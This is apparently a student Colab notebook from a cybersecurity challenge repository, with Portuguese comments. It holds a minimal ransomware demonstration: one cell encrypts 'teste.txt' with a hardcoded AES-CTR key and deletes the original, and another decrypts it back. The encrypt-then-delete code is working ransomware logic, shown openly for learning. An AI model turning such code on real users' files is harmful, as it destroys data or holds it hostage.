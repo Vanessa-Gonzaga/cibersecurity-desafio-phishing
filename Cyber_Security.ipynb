{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMz05Dfgp3XPsF/QJhgWfiQ",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Vanessa-Gonzaga/cibersecurity-desafio-phishing/blob/master/Cyber_Security.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pyaes\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KJ7skqIeMfnx",
        "outputId": "674d209b-a871-4535-a999-af50a584c560"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pyaes\n",
            "  Downloading pyaes-1.6.1.tar.gz (28 kB)\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: pyaes\n",
            "  Building wheel for pyaes (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pyaes: filename=pyaes-1.6.1-py3-none-any.whl size=26346 sha256=119b14521e0f82792de0b39b2903ad3b5919beb5c154b15e6111851965d323cf\n",
            "  Stored in directory: /root/.cache/pip/wheels/d6/84/5f/ea6aef85a93c7e1922486369874f4740a5642d261e09c59140\n",
            "Successfully built pyaes\n",
            "Installing collected packages: pyaes\n",
            "Successfully installed pyaes-1.6.1\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "OkJ14vrUKy-_"
      },
      "outputs": [],
      "source": [
        "import os\n",
        "import pyaes\n",
        "\n",
        "## abrir o arquivo criptografado\n",
        "file_name = \"teste.txt.ransomwaretroll\"\n",
        "file = open(file_name, \"rb\")\n",
        "file_data = file.read()\n",
        "file.close()\n",
        "\n",
        "## chave para descriptografia\n",
        "key = b\"testeransomwares\"\n",
        "aes = pyaes.AESModeOfOperationCTR(key)\n",
        "decrypt_data = aes.decrypt(file_data)\n",
        "\n",
        "## remover o arquivo criptografado\n",
        "os.remove(file_name)\n",
        "\n",
        "## criar o arquivo descriptografado\n",
        "new_file = \"teste.txt\"\n",
        "new_file = open(f'{new_file}', \"wb\")\n",
        "new_file.write(decrypt_data)\n",
        "new_file.close()"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import pyaes\n",
        "\n",
        "## abrir o arquivo a ser criptografado\n",
        "file_name = \"teste.txt\"\n",
        "file = open(file_name, \"rb\")\n",
        "file_data = file.read()\n",
        "file.close()\n",
        "\n",
        "## remover o arquivo\n",
        "os.remove(file_name)\n",
        "\n",
        "## chave de criptografia\n",
        "key = b\"testeransomwares\"\n",
        "aes = pyaes.AESModeOfOperationCTR(key)\n",
        "\n",
        "## criptografar o arquivo\n",
        "crypto_data = aes.encrypt(file_data)\n",
        "\n",
        "## salvar o arquivo criptografado\n",
        "new_file = file_name + \".ransomwaretroll\"\n",
        "new_file = open(f'{new_file}','wb')\n",
        "new_file.write(crypto_data)\n",
        "new_file.close()"
      ],
      "metadata": {
        "id": "oI4SZImLMnUW"
      },
      "execution_count": 7,
      "outputs": []
    }
  ]
}